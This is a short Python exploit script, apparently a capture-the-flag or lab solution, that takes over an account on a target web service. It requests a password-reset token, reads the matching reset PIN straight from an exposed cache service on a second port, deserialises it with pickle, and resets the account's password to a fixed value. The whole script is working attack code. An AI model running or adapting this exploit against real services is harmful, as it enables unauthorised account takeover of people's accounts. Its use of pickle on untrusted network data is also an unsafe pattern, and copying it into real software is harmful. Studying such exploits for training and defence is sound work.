#!/usr/bin/env python
import os
from requests import post

NODE_IP = os.environ['NODE_IP']

url0 = f'http://{NODE_IP}:30080/api/auth/reset-password'
c = post(url0, json={'email': 'hi@theori.io'})
password_reset_token = c.json()['data']['password_reset_token']
print(password_reset_token)

import pickle
import socket

s = socket.socket(2, 1)
s.connect((NODE_IP, 30082))
s.send(f'GET :1:{password_reset_token}\n'.encode('latin-1'))

def recvuntil(socket, data):
    tmp = b''
    while True:
        tmp += s.recv(1)
        if tmp.endswith(data):
            return tmp

recvuntil(s, b'\r\n') # length
x = recvuntil(s, b'\r\n').strip()
pin = pickle.loads(x)
print(f'pin: {pin}')

url1 = f'http://{NODE_IP}:30080/api/auth/reset-password-check'
c = post(url1, json={'email': 'hi@theori.io', 'password_reset_token': password_reset_token, 'pin': pin, 'password': 'theori1234'})
print(c.text)
